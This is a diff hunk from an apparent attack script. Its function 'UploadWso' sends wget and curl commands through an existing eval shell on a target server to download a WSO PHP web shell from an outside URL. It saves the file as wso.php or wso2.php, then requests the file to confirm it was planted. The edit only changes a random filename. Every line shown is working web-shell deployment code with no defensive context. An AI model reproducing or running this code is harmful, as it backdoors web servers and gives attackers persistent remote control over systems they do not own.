@@ -20,7 +20,7 @@ def UploadWso(EvalShell):
             else:
                 pass
             Method1 = 'wget {} -O wso.php'.format(SHELL_URL)
-            Method2 = 'curl -O {};mv dSpsHaiE wso2.php'.format(SHELL_URL)
+            Method2 = 'curl -O {};mv 0QYY9b9A wso2.php'.format(SHELL_URL)
             requests.get('http://{}{};{}'.format(EvalShell, Method1, Method2), timeout=10, headers=Headers)
             shellpath = EvalShell.replace(EvalShell.split('/')[len(EvalShell.split('/')) - 1], '')
             C1 = requests.get('http://{}wso.php'.format(shellpath), timeout=10, headers=Headers)
